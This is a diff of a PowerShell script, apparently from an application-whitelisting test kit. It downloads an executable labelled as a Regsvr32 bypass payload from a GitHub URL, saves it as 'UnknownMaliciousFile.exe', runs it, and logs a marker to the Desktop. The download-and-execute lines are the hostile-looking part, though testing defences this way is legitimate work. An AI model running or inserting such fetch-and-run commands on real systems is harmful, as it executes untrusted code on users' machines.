@@ -1,4 +1,4 @@
-$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/ReceiptAutoClose.exe'
+$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Regsvr32Bypass/Regsvr32OnlinePayload.exe'
 $output = "UnknownMaliciousFile.exe"
 $start_time = Get-Date
 
@@ -10,4 +10,6 @@ Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
 
 Start-Process -FilePath "UnknownMaliciousFile.exe"
 
-$DesktopPath = [Environment]::GetFolderPath('Desktop');echo "Regsvr32OnlineScriptBypass" >> $DesktopPath\\WLtester.txt
+Start-Process -FilePath "Regsvr32OfflinePayload.exe"
+
+$DesktopPath = [Environment]::GetFolderPath('Desktop');echo "Regsvr32OnlineScriptBypass." >> $DesktopPath\\WLtester.txt
